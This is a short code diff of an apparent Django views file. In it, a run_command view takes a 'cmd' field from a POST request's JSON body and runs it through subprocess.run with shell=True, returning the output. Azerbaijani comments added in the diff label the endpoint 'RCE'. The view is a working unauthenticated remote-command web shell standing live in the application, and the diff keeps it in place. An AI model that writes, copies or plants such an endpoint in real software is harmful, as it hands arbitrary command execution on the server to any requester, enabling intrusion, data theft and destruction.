@@ -52,13 +52,18 @@ def get_client_ip(request):
 def run_command(request):
     if request.method == "POST":
         try:
-            data = json.loads(request.body)  # JSON payload
+            # JSON body oxu
+            data = json.loads(request.body)
             cmd = data.get("cmd", "")
+            
+            # RCE icra
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
             output = result.stdout
         except Exception as e:
             output = str(e)
+        
         return HttpResponse(f"<pre>{output}</pre>")
+    
     return HttpResponse("POST methodu ilə istifadə edin")
     
 def index(request):
